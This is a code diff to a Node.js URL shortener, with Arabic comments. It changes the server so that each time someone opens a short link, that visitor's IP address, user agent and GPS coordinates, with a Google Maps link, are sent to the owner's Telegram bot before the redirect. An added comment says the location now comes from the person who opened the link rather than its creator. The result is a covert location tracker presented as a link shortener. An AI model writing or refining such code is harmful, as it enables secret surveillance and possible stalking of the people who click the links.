@@ -22,26 +22,25 @@ function generateShortCode() {
 async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
   try {
     let msg = `
-🔗 رابط جديد!
+🔗 رابط فُتح!
 ━━━━━━━━━━━
 📌 الكود: ${shortCode}
-🌐 الرابط: ${originalUrl}
+🌐 الرابط الأصلي: ${originalUrl}
 🔌 IP: ${ip}
 `;
 
     if (gps && gps.lat && gps.lng) {
       const accuracy = gps.accuracy ? gps.accuracy.toFixed(0) : '?';
       msg += `
-━━ موقع GPS ━━
 📍 دائرة العرض: ${gps.lat}
 📍 خط الطول: ${gps.lng}
 📏 الدقة: ±${accuracy} متر
 🗺️ الخريطة: https://maps.google.com/?q=${gps.lat},${gps.lng}
-📡 النوع: GPS (دقيق جداً)
+📡 النوع: GPS
 `;
     } else {
       msg += `
-⚠️ الموقع: لم يتم تفعيل GPS
+⚠️ الموقع: لم يتم الحصول على GPS
 `;
     }
 
@@ -54,23 +53,20 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
       { chat_id: TELEGRAM_CHAT_ID, text: msg }
     );
-    
-    console.log('[Telegram] Message sent with GPS:', gps ? 'YES' : 'NO');
   } catch (err) {
-    console.error('[Telegram] Error:', err.message);
+    console.error('Telegram Error:', err.message);
   }
 }
 
 app.post('/api/shorten', (req, res) => {
-  const { url, gps } = req.body;
+  const { url } = req.body;  // ← لا نحفظ GPS هنا!
   if (!url) return res.status(400).json({ error: 'URL required' });
 
   const shortCode = generateShortCode();
   linkStorage[shortCode] = { 
     original: url, 
     created: new Date(), 
-    clicks: 0,
-    gps: gps || null
+    clicks: 0
   };
 
   const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
@@ -83,13 +79,21 @@ app.get('/:code', (req, res) => {
 
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
   const userAgent = req.get('user-agent');
-  const gps = linkStorage[code].gps;
   const originalUrl = linkStorage[code].original;
+  
+  // ← الـ GPS هنا من الشخص الي فتح الرابط الآن، مو من صاحب الموقع
+  const gpsString = req.query.gps;
+  let gps = null;
+  
+  if (gpsString) {
+    try {
+      gps = JSON.parse(decodeURIComponent(gpsString));
+    } catch (e) {
+      console.log('GPS parse error');
+    }
+  }
 
   linkStorage[code].clicks++;
-  
-  console.log(`[Route] Code: ${code}, GPS: ${gps ? 'YES' : 'NO'}`);
-  
   sendToTelegram(ip, code, originalUrl, userAgent, gps);
   res.redirect(originalUrl);
 });
